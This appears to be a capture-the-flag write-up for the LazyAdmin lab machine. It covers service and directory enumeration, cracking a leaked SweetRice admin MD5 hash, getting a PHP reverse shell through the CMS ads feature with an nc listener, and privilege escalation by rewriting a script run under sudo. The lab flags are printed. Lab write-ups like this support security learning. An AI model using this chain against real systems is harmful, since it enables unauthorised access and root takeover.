### IP
`10.10.115.143`


# Enumeration
`nmap -sC -sV 10.10.115.143 -o LazyAdmin.nmap`
```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-14 02:57 EST
Nmap scan report for 10.10.115.143
Host is up (0.12s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)
|   256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)
|_  256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.23 seconds
```
* Going to the website, it looks like the default apache page
	* Let's try to find out more about the site
### Gobuster
`gobuster dir -u http://10.10.115.143/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -o gobusterScan.txt`
```
/content (Status: 301)
/server-status (Status: 403)
```
* `/server-status` is a 403, so I'm not interested in that. `content` looks like a redirect though... should be interesting
* let's do a second one for good measure:
`gobuster dir -u http://10.10.115.143/ -w /usr/share/wordlists/dirb/common.txt -t 50 -o gobusterScan2.txt`
```
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.115.143/
[+] Threads:        50
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/11/14 03:45:44 Starting gobuster
===============================================================
/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/content (Status: 301)
/.hta (Status: 403)
/index.html (Status: 200)
/server-status (Status: 403)
===============================================================
2020/11/14 03:45:59 Finished
===============================================================
```
* Nope. Just more 403s and stuff we've had before



* Okay... since `/content` is really the only useful directory here... let's run a scan on that

`gobuster dir -u http://10.10.115.143/content/ -w /usr/share/wordlists/dirb/common.txt -t 50 -o gobusterScan3.txt`
```
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.115.143/content/
[+] Threads:        50
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/11/14 03:58:00 Starting gobuster
===============================================================
/_themes (Status: 301)
/.htpasswd (Status: 403)
/as (Status: 301)
/attachment (Status: 301)
/.hta (Status: 403)
/.htaccess (Status: 403)
/images (Status: 301)
/inc (Status: 301)
/index.php (Status: 200)
/js (Status: 301)
===============================================================
2020/11/14 03:58:15 Finished
===============================================================
```
* `/as` looks like a login page!
* `/js` and `/inc` also might have some interesting stuff
	* `/inc/latest.txt` confirms that this is sweetrice version `1.5.1`!
	* `/inc/ads` should be taken note of. It become useful later
	* `/inc/mysql_backup/` has a file that looks interesting. When we download it, theres a username and hashed password
### Nikto
`nikto -host 10.10.115.143`

```
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.115.143
+ Target Hostname:    10.10.115.143
+ Target Port:        80
+ Start Time:         2020-11-14 03:02:55 (GMT-5)
---------------------------------------------------------------------------
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
+ Server may leak inodes via ETags, header found with file /, inode: 2c39, size: 59878d86c765e, mtime: gzip
+ Allowed HTTP Methods: POST, OPTIONS, GET, HEAD 
+ OSVDB-3233: /icons/README: Apache default file found.
+ 7889 requests: 0 error(s) and 7 item(s) reported on remote host
+ End Time:           2020-11-14 03:27:19 (GMT-5) (1464 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```
* smh 25 minutes of nikto and nothing useful

# Exploitation

### sql database
* there was an sql file stored at `/as/inc/my_sql_backup/`
* looking through it, there's a line with the following content:
```php
14 => 'INSERT INTO `%--%_options` VALUES(\'1\',\'global_setting\',\'a:17:{s:4:\\"name\\";s:25:\\"Lazy Admin&#039;s Website\\";s:6:\\"author\\";s:10:\\"Lazy Admin\\";s:5:\\"title\\";s:0:\\"\\";s:8:\\"keywords\\";s:8:\\"Keywords\\";s:11:\\"description\\";s:11:\\"Description\\";s:5:\\"admin\\";s:7:\\"manager\\";s:6:\\"passwd\\";s:32:\\"42f749ade7f9e195bf475f37a44cafcb\\";s:5:\\"close\\";i:1;s:9:\\"close_tip\\";s:454:\\"<p>Welcome to SweetRice - Thank your for install SweetRice as your website management system.</p><h1>This site is building now , please come late.</h1><p>If you are the webmaster,please go to Dashboard -> General -> Website setting </p><p>and uncheck the checkbox \\"Site close\\" to open your website.</p><p>More help at <a href=\\"http://www.basic-cms.org/docs/5-things-need-to-be-done-when-SweetRice-installed/\\">Tip for Basic CMS SweetRice installed</a></p>\\";s:5:\\"cache\\";i:0;s:13:\\"cache_expired\\";i:0;s:10:\\"user_track\\";i:0;s:11:\\"url_rewrite\\";i:0;s:4:\\"logo\\";s:0:\\"\\";s:5:\\"theme\\";s:0:\\"\\";s:4:\\"lang\\";s:9:\\"en-us.php\\";s:11:\\"admin_email\\";N;}\',\'1575023409\');',

```
* here, we can see that the admin is `manager` and the password is `42f749ade7f9e195bf475f37a44cafcb`
	* this doesn't look like the actual password though. It's more likely a hash
	* the hash is in hex and 32 characters long... its probably MD5

### password cracking
* putting the hash into a file called `passwordHash`, we can crack the password
* using john, we can execute the command `john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt passwordHash`
	* This outputs the password: `Password123`

### remote code execution
* log in with the username `manager` and the password `Password123`
* i noticed that there's a tab on the right of the admin page for `ads`
	* when we click on that, it allows for us to put in code that will execute
	* i took [this](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) code from pentestmonkey and changed the ip to my own and the host to 4444
	* then, I copied the code into the website, named it "Payload" and clicked "Done". The code shows that it has been uploaded
	* now, create a reverse listener on your own machine with `nc -lvnp 4444` (4444 is the port I specified in the payload)
	* once all that has been set up, we can go to the `/as/inc` directory and we can see a file called "Payload.php"
		* clicking on that brings up a shell in our netcat session

### file discovery
* now that we have access to a shell on the system, we can look around for the files
* `/home/itguy` has a file called `user.txt`
	* `cat user.txt` then gives us the user flag: `THM{63e5bce9271952aad1113b6f1ac28a07}`



### privesc
* we can assume the `root.txt` file is in the root directory, but how do we get it?
* running `sudo -l` gives us the following output:
```
Matching Defaults entries for www-data on THM-Chal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on THM-Chal:
    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
```
* here, we can see that `/home/itguy/backup.pl` can run sudo without a password
* unfortunately we can't edit that script, but when we cat it out, we can see that `itguy` made the mistake of running a script inside his sudo script:

```perl
#!/usr/bin/perl

system("sh", "/etc/copy.sh");
```

* let's edit the script running with `echo "cat /root/root.txt" > /etc/copy.sh`
* now, let's run the original script with `sudo perl backup.pl`
* unfortunately, doing that on the machine occasionally got me the following message:
```
sudo: no tty present and no askpass program specified
```
* however, we can make sudo non-interactive by adding a `-n` tag to the command to make it `sudo -n perl backup.sh`

	* that outputs the root flag: `THM{6637f41d0177b6f37cb20d775124699f}`
